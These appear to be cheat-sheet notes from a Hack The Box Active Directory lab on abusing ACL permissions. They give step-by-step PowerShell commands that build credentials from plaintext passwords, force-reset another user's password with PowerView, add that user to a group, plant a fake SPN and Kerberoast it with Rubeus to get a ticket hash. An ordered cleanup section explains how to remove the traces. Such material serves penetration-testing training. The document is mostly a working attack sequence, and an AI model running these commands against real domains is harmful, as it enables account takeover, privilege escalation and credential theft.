#### Creating a PSCredential Object\
Useful to authenticate as another user.
```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```
#### Creating a SecureString Object
```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
#### Changing the User's Password (Force-Change-Password)
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
#### Adding a User to a Group (Generic Write)
Repeat process of PSCredential to move laterally to new compromised users.
```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Check if he has been added:
```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

#### Create Fake SPN and Kerberoasting (GenericAll)
```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

[*]Hash:$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

## Cleanup
*Note* ORDER IS IMPORTANT ! If we remove ourselves from the group we wont be able to remove the fake SPN anymore.
#### Removing the Fake SPN from adunn's Account
```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
#### Removing damundsen from the Help Desk Level 1 Group
```powershell
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
#### Confirming damundsen was Removed from the Group
```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
